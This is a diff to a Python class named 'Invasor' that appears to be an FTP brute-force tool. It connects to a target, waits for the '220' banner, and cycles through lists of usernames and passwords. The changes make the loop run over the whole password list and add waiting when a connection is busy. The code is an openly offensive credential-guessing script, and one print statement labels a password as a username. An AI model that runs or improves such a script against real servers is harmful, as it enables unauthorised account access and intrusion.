@@ -17,11 +17,10 @@ class Invasor:
 
 
         self.invasor.connect((self.host,self.porta))
-        quantidade_de_senhas=199
         index_nomes_atual=0
         index_senha_atual=0
 
-        while index_senha_atual!=quantidade_de_senhas:
+        while index_senha_atual!=len(self.lista_de_senhas):
             index_senha_atual=int(index_senha_atual)
             mensagem_recebida=self.invasor.recv(1024).decode()
             if mensagem_recebida.startswith('220'):
@@ -36,7 +35,13 @@ class Invasor:
                 self.invasor.send((f'user {self.lista_de_nomes[index_nomes_atual]}').encode())
                 print (f'Enviado usuario {self.lista_de_senhas[index_senha_atual]}')
                 index_nomes_atual+=1
+            else:
+                print('Esperando uma conexão ser liberada...')
+                time.sleep(10)
+            
+            #tempo de espera por visibilidade
             time.sleep(0.2)
+            
 
 
 
